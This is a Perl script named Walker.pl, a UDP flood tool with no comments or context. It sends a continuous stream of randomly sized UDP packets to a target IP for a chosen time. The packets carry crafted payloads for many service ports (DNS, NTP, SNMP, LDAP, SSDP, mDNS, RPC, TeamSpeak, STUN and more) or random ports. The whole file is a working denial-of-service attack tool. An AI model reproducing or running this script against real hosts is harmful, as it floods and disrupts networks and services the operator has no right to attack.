#!/usr/bin/perl
use IO::Socket;
use strict;
if ($#ARGV != 1) {
 print "

Use: Perl Walker.pl IP TIME 
";
  exit(1);
}
my ($ip,$time) = @ARGV; 
my ($adress,$endtime,$payload,$porta,$variavel,$Caracteres,$psize);
$adress = inet_aton("$ip") or die exit(1);
$endtime = time() + ($time ? $time : 1000000);
my @Caracteres = ("\x00","\x01","\x02","\x03","\x04","\x05","\x06","\x07","\x08","\x09","\x0a","\x0b","\x0c","\x0d","\x0e","\x0f","\x10","\x11","\x12","\x13","\x14","\x15","\x16","\x17","\x18","\x19","\x1a","\x1b","\x1c","\x1d","\x1e","\x1f","\x20","\x21","\x22","\x23","\x24","\x25","\x26","\x27","\x28","\x29","\x2a","\x2b","\x2c","\x2d","\x2e","\x2f","\x30","\x31","\x32","\x33","\x34","\x35","\x36","\x37","\x38","\x39","\x3a","\x3b","\x3c","\x3d","\x3e","\x3f","\x40","\x41","\x42","\x43","\x44","\x45","\x46","\x47","\x48","\x49","\x4a","\x4b","\x4c","\x4d","\x4e","\x4f","\x50","\x51","\x52","\x53","\x54","\x55","\x56","\x57","\x58","\x59","\x5a","\x5b","\x5c","\x5d","\x5e","\x5f","\x60","\x61","\x62","\x63","\x64","\x65","\x66","\x67","\x68","\x69","\x6a","\x6b","\x6c","\x6d","\x6e","\x6f","\x70","\x71","\x72","\x73","\x74","\x75","\x76","\x77","\x78","\x79","\x7a","\x7b","\x7c","\x7d","\x7e","\x7f","\x80","\x81","\x82","\x83","\x84","\x85","\x86","\x87","\x88","\x89","\x8a","\x8b","\x8c","\x8d","\x8e","\x8f","\x90","\x91","\x92","\x93","\x94","\x95","\x96","\x97","\x98","\x99","\x9a","\x9b","\x9c","\x9d","\x9e","\x9f","\xa0","\xa1","\xa2","\xa3","\xa4","\xa5","\xa6","\xa7","\xa8","\xa9","\xaa","\xab","\xac","\xad","\xae","\xaf","\xb0","\xb1","\xb2","\xb3","\xb4","\xb5","\xb6","\xb7","\xb8","\xb9","\xba","\xbb","\xbc","\xbd","\xbe","\xbf","\xc0","\xc1","\xc2","\xc3","\xc4","\xc5","\xc6","\xc7","\xc8","\xc9","\xca","\xcb","\xcc","\xcd","\xce","\xcf","\xd0","\xd1","\xd2","\xd3","\xd4","\xd5","\xd6","\xd7","\xd8","\xd9","\xda","\xdb","\xdc","\xdd","\xde","\xdf","\xe0","\xe1","\xe2","\xe3","\xe4","\xe5","\xe6","\xe7","\xe8","\xe9","\xea","\xeb","\xec","\xed","\xee","\xef","\xf0","\xf1","\xf2","\xf3","\xf4","\xf5","\xf6","\xf7","\xf8","\xf9","\xfa","\xfb","\xfc","\xfd","\xfe","\xff");
socket(flood, AF_INET, SOCK_DGRAM, 17);
for (;time() <= $endtime;) 
{
$variavel = int rand(53);
$psize = int(rand(65535-64)+64);
if($variavel == 1) { $payload = "\x0D\x0A\x0D\x0A"; $porta = "7"; }
elsif($variavel == 2) { $payload = "\x0D\x0A\x0D\x0A"; $porta = "7"; }
elsif($variavel == 3) { $payload = $Caracteres[rand @Caracteres] . "\x01\x00\x00\x01\x00\x00\x00\x00\x00\x00\x03\x77\x77\x77\x06\x67\x6f\x6f\x67\x6c\x65\x03\x63\x6f\x6d\x00\x00\x01\x00\x01"; $porta = "53"; }
elsif($variavel == 4) { $payload = $Caracteres[rand @Caracteres] . "\x01\x00\x00\x01\x00\x00\x00\x00\x00\x00\x03\x77\x77\x77\x06\x67\x6f\x6f\x67\x6c\x65\x03\x63\x6f\x6d\x00\x00\x05\x00\x01"; $porta = "53"; }
elsif($variavel == 5) { $payload = "\x72\xFE\x1D\x13\x00\x00\x00\x00\x00\x00\x00\x02\x00\x01\x86\xA0\x00\x01\x97\x7C\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00"; $porta = "111"; }
elsif($variavel == 6) { $payload = "\xd9\x00\x0a\xfa\x00\x00\x00\x00\x00\x01\x02\x90\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\xc5\x02\x04\xec\xec\x42\xee\x92"; $porta = "123"; }
elsif($variavel == 7) { $payload = "\x01\x00\x00\x01\x00\x00\x00\x00\x00\x00\x03\x77\x77\x77\x06\x67\x6f\x6f\x67\x6c\x65\x03\x63\x6f\x6d\x00\x00\x05\x00\x01"; $porta = "137"; }
elsif($variavel == 8) { $payload = $Caracteres[rand @Caracteres] . $Caracteres[rand @Caracteres] . $Caracteres[rand @Caracteres] . $Caracteres[rand @Caracteres] . $Caracteres[rand @Caracteres]; $porta = "138"; }
elsif($variavel == 9) { $payload = "\x30\x3A\x02\x01\x03\x30\x0F\x02\x02\x4A\x69\x02\x03\x00\xFF\xE3\x04\x01\x04\x02\x01\x03\x04\x10\x30\x0E\x04\x00\x02\x01\x00\x02\x01\x00\x04\x00\x04\x00\x04\x00\x30\x12\x04\x00\x04\x00\xA0\x0C\x02\x02\x37\xF0\x02\x01\x00\x02\x01\x00\x30\x00"; $porta = "161"; }
elsif($variavel == 10) { $payload = "\x00\x01\x00\x02\x00\x01\x00"; $porta = "177"; }
elsif($variavel == 11) { $payload = "\x30\x84\x00\x00\x00\x2d\x02\x01\x07\x63\x84\x00\x00\x00\x24\x04\x00\x0a\x01\x00\x0a\x01\x00\x02\x01\x00\x02\x01\x64\x01\x01\x00\x87\x0b\x6f\x62\x6a\x65\x63\x74\x43\x6c\x61\x73\x73\x30\x84\x00\x00\x00\x00"; $porta = "389"; }
elsif($variavel == 12) { $payload = "\x02\x01\x00\x006\x00\x00\x00\x00\x00\x01\x00\x02en\x00\x00\x00\x15service:service-agent\x00\x07default\x00\x00\x00\x00"; $porta = "427"; }
elsif($variavel == 13) { $payload = "\x00\x11\x22\x33\x44\x55\x66\x77\x00\x00\x00\x00\x00\x00\x00\x00\x01\x10\x02\x00\x00\x00\x00\x00\x00\x00\x00\xC0\x00\x00\x00\xA4\x00\x00\x00\x01\x00\x00\x00\x01\x00\x00\x00\x98\x01\x01\x00\x04\x03\x00\x00\x24\x01\x01\x00\x00\x80\x01\x00\x05\x80\x02\x00\x02\x80\x03\x00\x01\x80\x04\x00\x02\x80\x0B\x00\x01\x00\x0C\x00\x04\x00\x00\x00\x01\x03\x00\x00\x24\x02\x01\x00\x00\x80\x01\x00\x05\x80\x02\x00\x01\x80\x03\x00\x01\x80\x04\x00\x02\x80\x0B\x00\x01\x00\x0C\x00\x04\x00\x00\x00\x01\x03\x00\x00\x24\x03\x01\x00\x00\x80\x01\x00\x01\x80\x02\x00\x02\x80\x03\x00\x01\x80\x04\x00\x02\x80\x0B\x00\x01\x00\x0C\x00\x04\x00\x00\x00\x01"; $porta = "500"; }
elsif($variavel == 14) { $payload = "\x01\x01\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x10"; $porta = "520"; }
elsif($variavel == 15) { $payload = "\x06\x00\xff\x07\x00\x00\x00\x00\x00\x00\x00\x00\x00\x09\x20\x18\xc8\x81\x00\x38\x8e\x04\xb5"; $porta = "623"; }
elsif($variavel == 16) { $payload = "SNQUERY: 127.0.0.1:AAAAAA:xsvr"; $porta = "626"; }
elsif($variavel == 17) { $payload = "8d\xc1x\x01\xb8\x9b\xcb\x8f\0\0\0\0\0"; $porta = "1194"; }
elsif($variavel == 18) { $payload = "\x02"; $porta = "1434"; }
elsif($variavel == 19) { $payload = "\x1e\x00\x01\x30\x02\xfd\xa8\xe3\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00"; $porta = "1604"; }
elsif($variavel == 20) { $payload = "\x4d\x2d\x53\x45\x41\x52\x43\x48\x20\x2a\x20\x48\x54\x54\x50\x2f\x31\x2e\x31\x0d\x0a\x48\x4f\x53\x54\x3a\x20\x32\x35\x35\x2e\x32\x35\x35\x2e\x32\x35\x35\x2e\x32\x35\x35\x3a\x31\x39\x30\x30\x0d\x0a\x4d\x41\x4e\x3a\x20\x22\x73\x73\x64\x70\x3a\x64\x69\x73\x63\x6f\x76\x65\x72\x22\x0d\x0a\x4d\x58\x3a\x20\x31\x0d\x0a\x53\x54\x3a\x20\x75\x72\x6e\x3a\x64\x69\x61\x6c\x2d\x6d\x75\x6c\x74\x69\x73\x63\x72\x65\x65\x6e\x2d\x6f\x72\x67\x3a\x73\x65\x72\x76\x69\x63\x65\x3a\x64\x69\x61\x6c\x3a\x31\x0d\x0a\x55\x53\x45\x52\x2d\x41\x47\x45\x4e\x54\x3a\x20\x47\x6f\x6f\x67\x6c\x65\x20\x43\x68\x72\x6f\x6d\x65\x2f\x36\x30\x2e\x30\x2e\x33\x31\x31\x32\x2e\x39\x30\x20\x57\x69\x6e\x64\x6f\x77\x73\x0d\x0a\x0d\x0a"; $porta = "1900"; }
elsif($variavel == 21) { $payload = "\x00\x00\x00\x00\x00\x01\x00\x00\x00\x00\x00\x00\x09_services\x07_dns-sd\x04_udp\x05local\x00\x00\x0C\x00\x01"; $porta = "5353"; }
elsif($variavel == 22) { $payload = "xf4\xbe\x03\x00\x00\x00\x00\x00\x00\x00\x00\x00\x01\x00\x00\x002x\xba\x85\tTeamSpeak\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\nWindows XP\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x02\x00\x00\x00 \x00<\x00\x00\x01\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x08nickname\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00"; $porta = "8767"; }
elsif($variavel == 23) { $payload = "\x05\xca\x7f\x16\x9c\x11\xf9\x89\x00\x00\x00\x00\x02\x9d\x74\x8b\x45\xaa\x7b\xef\xb9\x9e\xfe\xad\x08\x19\xba\xcf\x41\xe0\x16\xa2\x32\x6c\xf3\xcf\xf4\x8e\x3c\x44\x83\xc8\x8d\x51\x45\x6f\x90\x95\x23\x3e\x00\x97\x2b\x1c\x71\xb2\x4e\xc0\x61\xf1\xd7\x6f\xc5\x7e\xf6\x48\x52\xbf\x82\x6a\xa2\x3b\x65\xaa\x18\x7a\x17\x38\xc3\x81\x27\xc3\x47\xfc\xa7\x35\xba\xfc\x0f\x9d\x9d\x72\x24\x9d\xfc\x02\x17\x6d\x6b\xb1\x2d\x72\xc6\xe3\x17\x1c\x95\xd9\x69\x99\x57\xce\xdd\xdf\x05\xdc\x03\x94\x56\x04\x3a\x14\xe5\xad\x9a\x2b\x14\x30\x3a\x23\xa3\x25\xad\xe8\xe6\x39\x8a\x85\x2a\xc6\xdf\xe5\x5d\x2d\xa0\x2f\x5d\x9c\xd7\x2b\x24\xfb\xb0\x9c\xc2\xba\x89\xb4\x1b\x17\xa2\xb6"; $porta = "9987"; }
elsif($variavel == 24) { $payload = "std"; $porta = "80"; }
elsif($variavel == 25) { $payload = "ripe"; $porta = "80"; }
elsif($variavel == 26) { $payload = $Caracteres[rand @Caracteres] . $Caracteres[rand @Caracteres] . $Caracteres[rand @Caracteres] . $Caracteres[rand @Caracteres] . $Caracteres[rand @Caracteres] . $Caracteres[rand @Caracteres]; $porta = "80"; }
elsif($variavel == 27) { $payload = $Caracteres[rand @Caracteres] . $Caracteres[rand @Caracteres] . $Caracteres[rand @Caracteres] . $Caracteres[rand @Caracteres] . $Caracteres[rand @Caracteres] . $Caracteres[rand @Caracteres]; $porta = "8080"; }
elsif($variavel == 28) { $payload = $Caracteres[rand @Caracteres].$Caracteres[rand @Caracteres].$Caracteres[rand @Caracteres].$Caracteres[rand @Caracteres]."\x00\x00\x00\x00\x00\x00\x00\x02\x00\x01\x86\xA0".$Caracteres[rand @Caracteres].$Caracteres[rand @Caracteres].$Caracteres[rand @Caracteres].$Caracteres[rand @Caracteres]."\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00"; $porta = "111"; }
elsif($variavel == 29) { $payload = "\x12\x03".$Caracteres[rand @Caracteres]."\x11\x01\x01".$Caracteres[rand @Caracteres].$Caracteres[rand @Caracteres].$Caracteres[rand @Caracteres].$Caracteres[rand @Caracteres].$Caracteres[rand @Caracteres].$Caracteres[rand @Caracteres].$Caracteres[rand @Caracteres].$Caracteres[rand @Caracteres]."\x64\x6e"; $porta = "138"; }
elsif($variavel == 30) { $payload = "\x30\x3A\x02\x01\x03\x30\x0F\x02\x02" .$Caracteres[rand @Caracteres] .$Caracteres[rand @Caracteres]. + "\x02\x03\x00\xFF\xE3\x04\x01\x04\x02\x01\x03\x04\x10\x30\x0E\x04\x00\x02\x01\x00\x02\x01\x00\x04\x00\x04\x00\x04\x00\x30\x12\x04\x00\x04\x00\xA0\x0C\x02\x02" .$Caracteres[rand @Caracteres]. $Caracteres[rand @Caracteres]. + "\x02\x01\x00\x02\x01\x00\x30\x00"; $porta = "161"; }
elsif($variavel == 31) { $payload = "\x30\x84\x00\x00\x00\x2d\x02\x01" .$Caracteres[rand @Caracteres]. "\x63\x84\x00\x00\x00\x24\x04\x00\x0a\x01\x00\x0a\x01\x00\x02\x01\x00\x02\x01\x64\x01\x01\x00\x87\x0b\x6f\x62\x6a\x65\x63\x74\x43\x6c\x61\x73\x73\x30\x84\x00\x00\x00\x00"; $porta = "389"; }
elsif($variavel == 32) { $payload = "\x02\x01" . $Caracteres[rand @Caracteres] . $Caracteres[rand @Caracteres] . $Caracteres[rand @Caracteres] . "\x00\x00" . $Caracteres[rand @Caracteres] . $Caracteres[rand @Caracteres] . $Caracteres[rand @Caracteres] . $Caracteres[rand @Caracteres] . $Caracteres[rand @Caracteres] . "\x00\x02en\x00\x00\x00\x15service:service-agent\x00\x07default\x00\x00\x00\x00"; $porta = "427"; }
elsif($variavel == 33) { $payload = "\x06\x00" .$Caracteres[rand @Caracteres]. "\x07\x00" .$Caracteres[rand @Caracteres]. $Caracteres[rand @Caracteres] .$Caracteres[rand @Caracteres]. $Caracteres[rand @Caracteres] .$Caracteres[rand @Caracteres]. $Caracteres[rand @Caracteres] .$Caracteres[rand @Caracteres]. $Caracteres[rand @Caracteres] + "\x00\x00\x00\x00\x09\x20\x18\xc8\x81\x00\x38\x8e\x04\xb5"; $porta = "623"; }
elsif($variavel == 34) { $payload = $Caracteres[rand @Caracteres] . $Caracteres[rand @Caracteres] . "\x00\x00\x00\x01\x00\x00\x00\x00\x00\x00\x09_services\x07_dns-sd\x04_udp\x05local\x00\x00\x0C\x00\x01"; $porta = "5353"; }
elsif($variavel == 35) { $payload = "\xb4\x43\x26\x65\xe8\x1b\x00\x05\xb7\x70\xb4\x6b\x08\x00\x45\x00\x00\x7c\x38\x97\x00\x00\x64\x11\xec\x6a\xc0\xa8\x64\x04\xbd\x0c\x4f\xb6\x63\x4a\x11\xdc\x00\x68\x26\xa3\x00\x01\x00\x4c\x21\x12\xa4\x42\xe3\x8f\x46\xdf\x08\x20\xd5\xaa\x7a\x91\x6a\x78\x00\x06\x00\x09\x37\x49\x51\x4c\x3a\x49\x51\x4c\x55\x00\x00\x00\x80\x70\x00\x04\x00\x00\x00\x07\x00\x24\x00\x04\x6e\xff\xfd\xfe\x80\x2a\x00\x08\x00\x00\x01\x30\x19\x8f\x37\x90\x00\x08\x00\x14\x1c\x02\x27\x4e\xae\xb8\xcc\x70\xb0\x58\x4f\xb8\x04\x22\x04\xf9\x11\x98\x8d\x36\x80\x28\x00\x04\x12\xe3\x5c\x01"; $porta = "3478"; }
elsif($variavel == 36) { $payload = "\x6e\x32\x4e\x49\x24\xf2\xbc\xbe\x00\x00\x00\x00\x00\x00\x00\x00"; $porta = "500"; }
elsif($variavel == 37) { $payload = "\x00\x01\x2f\x78\x00\x6e\x65\x74\x61\x73\x63\x69\x69\x00"; $porta = "69"; }
elsif($variavel == 38) { $payload = "\x01\x01\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x10"; $porta = "520"; }
elsif($variavel == 39) { $payload = "\x00\x00"; $porta = "5351"; }
elsif($variavel == 40) { $payload = "\x00\x11\x22\x33\x44\x55\x66\x77\x00\x00\x00\x00\x00\x00\x00\x00\x01\x10\x02\x00\x00\x00\x00\x00\x00\x00\x00\xC0\x00\x00\x00\xA4\x00\x00\x00\x01\x00\x00\x00\x01\x00\x00\x00\x98\x01\x01\x00\x04\x03\x00\x00\x24\x01\x01\x00\x00\x80\x01\x00\x05\x80\x02\x00\x02\x80\x03\x00\x01\x80\x04\x00\x02\x80\x0B\x00\x01\x00\x0C\x00\x04\x00\x00\x00\x01\x03\x00\x00\x24\x02\x01\x00\x00\x80\x01\x00\x05\x80\x02\x00\x01\x80\x03\x00\x01\x80\x04\x00\x02\x80\x0B\x00\x01\x00\x0C\x00\x04\x00\x00\x00\x01\x03\x00\x00\x24\x03\x01\x00\x00\x80\x01\x00\x01\x80\x02\x00\x02\x80\x03\x00\x01\x80\x04\x00\x02\x80\x0B\x00\x01\x00\x0C\x00\x04\x00\x00\x00\x01"; $porta = "500"; }
elsif($variavel == 41) { $payload = "\x6e\x32\x4e\x49\x24\xf2\xbc\xbe\x00\x00\x00\x00\x00\x00\x00\x00"; $porta = "500"; }
elsif($variavel == 42) { $payload = "\x49\x4e\x56\x49\x54\x45\x20\x73\x69\x70\x3a\x74\x65\x73\x74\x40\x31\x30\x2e\x30\x2e\x32\x2e\x31\x35\x3a\x35\x30\x36\x30\x20\x53\x49\x50\x2f\x32\x2e\x30\x0d\x0a\x56\x69\x61\x3a\x20\x53\x49\x50\x2f\x32\x2e\x30\x2f\x55\x44\x50\x20\x31\x30\x2e\x30\x2e\x32\x2e\x32\x30\x3a\x35\x30\x36\x30\x3b\x62\x72\x61\x6e\x63\x68\x3d\x7a\x39\x68\x47\x34\x62\x4b\x2d\x32\x31\x38\x37\x2d\x31\x2d\x30\x0d\x0a\x46\x72\x6f\x6d\x3a\x20\x22\x44\x56\x49\x34\x2f\x38\x30\x30\x30\x22\x20\x3c\x73\x69\x70\x3a\x73\x69\x70\x70\x40\x31\x30\x2e\x30\x2e\x32\x2e\x32\x30\x3a\x35\x30\x36\x30\x3e\x3b\x74\x61\x67\x3d\x31\x0d\x0a\x54\x6f\x3a\x20\x74\x65\x73\x74\x20\x3c\x73\x69\x70\x3a\x74\x65\x73\x74\x40\x31\x30\x2e\x30\x2e\x32\x2e\x31\x35\x3a\x35\x30\x36\x30\x3e\x0d\x0a\x43\x61\x6c\x6c\x2d\x49\x44\x3a\x20\x31\x2d\x32\x31\x38\x37\x40\x31\x30\x2e\x30\x2e\x32\x2e\x32\x30\x0d\x0a\x43\x53\x65\x71\x3a\x20\x31\x20\x49\x4e\x56\x49\x54\x45\x0d\x0a\x43\x6f\x6e\x74\x61\x63\x74\x3a\x20\x73\x69\x70\x3a\x73\x69\x70\x70\x40\x31\x30\x2e\x30\x2e\x32\x2e\x32\x30\x3a\x35\x30\x36\x30\x0d\x0a\x4d\x61\x78\x2d\x46\x6f\x72\x77\x61\x72\x64\x73\x3a\x20\x37\x30\x0d\x0a\x43\x6f\x6e\x74\x65\x6e\x74\x2d\x54\x79\x70\x65\x3a\x20\x61\x70\x70\x6c\x69\x63\x61\x74\x69\x6f\x6e\x2f\x73\x64\x70\x0d\x0a\x43\x6f\x6e\x74\x65\x6e\x74\x2d\x4c\x65\x6e\x67\x74\x68\x3a\x20\x20\x20\x30\x0d\x0a"; $porta = "500"; }
elsif($variavel == 43) { $payload = "\xff\xff\xff\xff\x67\x65\x74\x73\x74\x61\x74\x75\x73\x0a"; $porta = "9987"; }
elsif($variavel == 44) { $payload = "\x7A\x00\x00\x00\x00\x00"; $porta = "9987"; }
elsif($variavel == 45) { $payload = ""; $porta = int(rand(65535)); }
elsif($variavel == 46) { $payload = "$psize$psize$psize$psize$psize$psize$psize$psize$psize$psize$psize$psize$psize$psize$psize$psize$psize$psize$psize$psize$psize$psize$psize$psize$psize$psize$psize$psize$psize$psize$psize$psize$psize$psize$psize$psize$psize$psize$psize$psize$psize$psize$psize$psize$psize$psize$psize$psize$psize$psize$psize$psize$psize$psize$psize$psize$psize$psize$psize$psize$psize$psize$psize$psize$psize$psize$psize"; $porta = int(rand(65535)); }
elsif($variavel == 47) { $payload = "$psize$psize$psize$psize$psize$psize$psize$psize$psize$psize$psize$psize$psize$psize$psize$psize$psize$psize$psize$psize$psize$psize$psize$psize$psize$psize$psize$psize$psize$psize$psize$psize$psize$psize$psize$psize$psize$psize$psize$psize$psize$psize$psize$psize$psize$psize$psize$psize$psize$psize$psize$psize$psize$psize$psize$psize$psize$psize$psize$psize$psize$psize$psize$psize$psize$psize$psize"; $porta = int(rand(65535)); }
elsif($variavel == 48) { $payload = "$psize$psize$psize$psize$psize$psize$psize$psize$psize$psize$psize$psize$psize$psize$psize$psize$psize$psize$psize$psize$psize$psize$psize$psize$psize$psize$psize$psize$psize$psize$psize$psize$psize$psize$psize$psize$psize$psize$psize$psize$psize$psize$psize$psize$psize$psize$psize$psize$psize$psize$psize$psize$psize$psize$psize$psize$psize$psize$psize$psize$psize$psize$psize$psize$psize$psize$psize$psize$psize$psize$psize$psize$psize$psize$psize$psize$psize$psize$psize$psize$psize$psize$psize$psize$psize$psize$psize$psize$psize$psize$psize$psize$psize$psize$psize$psize$psize$psize$psize$psize$psize$psize$psize$psize$psize$psize$psize$psize$psize$psize$psize$psize$psize$psize$psize$psize$psize$psize$psize$psize$psize$psize$psize$psize$psize$psize$psize$psize$psize$psize$psize$psize$psize$psize$psize$psize$psize$psize$psize$psize$psize$psize$psize$psize$psize$psize$psize$psize$psize$psize$psize$psize$psize$psize$psize$psize$psize$psize$psize$psize$psize$psize$psize$psize$psize$psize$psize$psize$psize$psize$psize$psize$psize$psize$psize$psize$psize$psize$psize$psize$psize$psize$psize$psize$psize$psize$psize$psize$psize$psize$psize$psize$psize$psize$psize$psize$psize$psize$psize$psize$psize$psize$psize$psize$psize$psize$psize$psize$psize$psize$psize$psize$psize$psize$psize$psize$psize$psize$psize$psize$psize$psize$psize$psize$psize$psize$psize$psize$psize$psize$psize$psize$psize$psize$psize$psize$psize$psize$psize$psize$psize$psize$psize$psize$psize$psize$psize$psize$psize$psize$psize$psize$psize$psize$psize$psize$psize$psize$psize$psize$psize$psize$psize$psize$psize$psize$psize$psize$psize$psize$psize$psize$psize$psize$psize$psize$psize$psize$psize$psize$psize$psize$psize$psize$psize$psize$psize$psize$psize$psize$psize$psize$psize$psize$psize$psize$psize$psize$psize$psize$psize$psize$psize$psize$psize$psize$psize$psize$psize$psize$psize$psize$psize$psize$psize$psize$psize$psize$psize$psize$psize$psize$psize$psize$psize$psize$psize$psize$psize$psize$psize$psize$psize$psize$psize$psize$psize$psize$psize$psize$psize$psize$psize$psize$psize$psize$psize$psize$psize$psize$psize$psize$psize$psize$psize$psize$psize$psize$psize$psize$psize$psize$psize$psize$psize$psize$psize$psize$psize$psize$psize$psize$psize$psize$psize$psize$psize$psize$psize$psize$psize$psize$psize$psize$psize$psize$psize$psize$psize$psize$psize$psize$psize$psize$psize$psize$psize$psize$psize$psize$psize$psize$psize$psize$psize$psize$psize$psize$psize$psize$psize$psize$psize$psize$psize$psize$psize$psize$psize$psize$psize$psize$psize$psize$psize$psize$psize$psize$psize$psize$psize$psize$psize$psize$psize$psize$psize$psize$psize$psize$psize$psize$psize$psize$psize$psize$psize$psize$psize$psize$psize$psize$psize$psize$psize$psize$psize$psize$psize$psize$psize$psize$psize$psize$psize$psize$psize$psize$psize$psize$psize$psize$psize$psize$psize$psize$psize$psize$psize$psize$psize$psize$psize$psize$psize$psize$psize$psize$psize$psize$psize$psize$psize$psize$psize$psize$psize$psize$psize$psize$psize$psize$psize$psize$psize$psize$psize$psize$psize$psize$psize$psize$psize$psize$psize$psize$psize$psize$psize$psize$psize$psize$psize$psize$psize$psize$psize$psize$psize$psize$psize$psize$psize$psize$psize$psize$psize$psize$psize$psize$psize$psize$psize$psize$psize$psize$psize$psize$psize$psize$psize$psize$psize$psize$psize$psize$psize$psize$psize$psize$psize$psize$psize$psize$psize$psize$psize$psize$psize$psize$psize$psize$psize$psize$psize$psize$psize$psize$psize$psize$psize$psize$psize$psize$psize$psize$psize$psize$psize$psize$psize$psize$psize$psize$psize$psize$psize$psize$psize$psize$psize$psize$psize$psize$psize$psize$psize$psize$psize$psize$psize$psize$psize$psize$psize$psize$psize$psize$psize$psize$psize$psize$psize$psize$psize$psize$psize$psize$psize$psize$psize$psize$psize$psize$psize$psize$psize$psize$psize$psize$psize$psize$psize$psize$psize$psize$psize$psize$psize$psize$psize$psize$psize$psize$psize$psize$psize$psize$psize$psize$psize$psize$psize$psize$psize$psize$psize$psize$psize$psize"; $porta = int(rand(65535)); }
elsif($variavel == 49) { $payload = $Caracteres[rand @Caracteres] . $Caracteres[rand @Caracteres] . $Caracteres[rand @Caracteres] . $Caracteres[rand @Caracteres] . $Caracteres[rand @Caracteres]; $porta = int(rand(65535)); }
elsif($variavel == 50) { $payload = "\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x02\x55\x55\x55\x55\x00\x00\x00\x01\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\xff\xff\x55\x13\x00\x00\x00\x30\x00\x00\x00\x01\x00\x00\x00\x02\x00\x00\x00\x00\x00\x00\x00\x00"; $porta = "17185"; }
elsif($variavel == 51) { $payload = "\x16\xfe\xff\x00\x00\x00\x00\x00\x00\x00\x00\x00\x36\x01\x00\x00\x2a\x00\x00\x00\x00\x00\x00\x00\x2a\xfe\xfd\x00\x00\x00\x00\x7c\x77\x40\x1e\x8a\xc8\x22\xa0\xa0\x18\xff\x93\x08\xca\xac\x0a\x64\x2f\xc9\x22\x64\xbc\x08\xa8\x16\x89\x19\x3f\x00\x00\x00\x02\x00\x2f\x01\x00"; $porta = "445"; }
elsif($variavel == 52) { $payload = "\x00\x00"; $porta = "4500"; }
elsif($variavel == 53) { $payload = "\x0d\x31\x32\x33\x34\x35\x36\x37\x38\x51\x39\x39\x39\x00"; $porta = "80"; }
send(flood, pack("a" . $psize, $payload), 0, pack_sockaddr_in($porta, $adress));
};